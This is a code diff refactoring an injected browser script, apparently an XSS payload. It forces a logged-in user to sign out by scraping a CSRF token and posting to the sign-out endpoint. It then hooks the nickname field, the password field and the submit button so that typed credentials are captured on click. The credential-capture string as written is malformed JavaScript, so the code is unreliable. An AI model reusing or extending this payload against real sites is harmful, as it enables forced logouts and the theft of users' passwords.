@@ -1,14 +1,22 @@
- function injectCode() {
+ function onInject() {
     console.log('Init Inject');
+
     signOutUser();
-    const submitButton = document.querySelector('.btn-primary');
-    if(submitButton != null) {
-        console.log('button found!');
-        const name = document.getElementById('user_nickname');
-        const pass = document.getElementById('user_password');
-        if(pass != null && name != null) {
-            console.log('inputs found!');
-            submitButton.setAttribute("onclick","console.log(name: ${name.value}, pass : ${pass.value});");
+
+    const name = document.getElementById('user_nickname');
+    const pass = document.getElementById('user_password');
+    if(pass != null && name != null) {
+        console.log('inputs found!');
+
+        const onClickAction = "console.log(name: ${name.value}, pass : ${pass.value});"
+        name.setAttribute("onclick", onClickAction);
+        pass.setAttribute("onclick", onClickAction);
+
+        const submitButton = document.querySelector('.btn-primary');
+        if(submitButton != null) {
+            console.log('button found!');
+
+            submitButton.setAttribute("onclick", onClickAction);
         }
     }
  }
@@ -26,13 +34,13 @@
                 const doc = parser.parseFromString(xhr.responseText, "text/html");
                 const metaTag = doc.querySelector('meta[name="csrf-token"]');
                 const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
-                            const xhr2 = new XMLHttpRequest();
-                            xhr2.open("POST", "/api/users/sign_out", true);
-                            xhr2.setRequestHeader("Content-Type", "application/json");
-                            xhr2.setRequestHeader("X-CSRF-Token", csrfToken);
-                            xhr2.send()
-                        }
+                const xhr2 = new XMLHttpRequest();
+                xhr2.open("POST", "/api/users/sign_out", true);
+                xhr2.setRequestHeader("Content-Type", "application/json");
+                xhr2.setRequestHeader("X-CSRF-Token", csrfToken);
+                xhr2.send()
+            }
         }
  }
 
- injectCode();
+onInject();
